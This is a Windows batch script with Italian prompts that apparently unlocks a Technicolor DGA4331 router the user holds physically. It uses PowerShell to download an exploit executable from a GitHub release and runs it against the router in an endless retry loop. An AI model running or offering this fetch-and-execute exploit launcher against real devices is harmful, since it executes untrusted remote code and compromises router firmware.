@echo off
title [2] ATTACCO POTENTE DGA4331
color 0C
echo ======================================================
echo    ATTACCO AGGRESSIVO AL TECHNICOLOR DGA4331
echo ======================================================

:: Scarica l'exploit se non c'è
if not exist "exploit.exe" (
    echo [!] Download motore di attacco...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/the-beast-of-the-east/tch-exploit/releases/download/v1.0.1/tch-exploit-win.exe' -OutFile 'exploit.exe'"
)

:ATTACK_LOOP
cls
echo ======================================================
echo    ATTACCO IN CORSO... (LOOP INFINITO)
echo ======================================================
echo.
echo [!] ISTRUZIONI:
echo 1. Tieni il RESET premuto.
echo 2. Accendi il router.
echo 3. Se l'attacco fallisce, lo script ricomincia DA SOLO.
echo.
echo [+] Tentativo di sblocco in corso...
exploit.exe -i 58.162.0.1

:: Se il programma fallisce o si chiude, torna all'inizio e riprova
echo.
echo [!] Il router non ha risposto. Riprovo in 2 secondi...
timeout /t 2 >nul
goto ATTACK_LOOP
